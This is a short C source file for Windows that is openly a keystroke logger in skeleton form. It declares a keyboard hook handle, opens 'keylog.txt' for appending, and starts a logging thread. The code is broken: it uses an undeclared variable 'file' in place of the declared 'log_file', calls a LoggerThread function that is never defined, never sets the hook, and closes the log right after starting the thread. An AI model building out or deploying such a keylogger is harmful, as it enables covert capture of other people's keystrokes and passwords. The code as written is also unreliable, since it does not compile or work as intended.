#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

static HHOOK hook = NULL;
static FILE *log_file = NULL;

int main() {
    
    // Open a file to log the keys
    file = fopen("keylog.txt", "a");
    if(!file){
        MessageBox(NULL, "Could not open log file", "Error", MB_ICONERROR);
        return 1;
    }

    // Thread logger
    HANDLE thread = CreateThread(NULL, 0, LoggerThread, NULL, 0, NULL);
    if(!thread) {
        MessageBox(NULL, "CreateThread failed", "Error", MB_ICONERROR);
        fclose(file);
        return 1;
    }



    fclose(file);
    return 0;
}
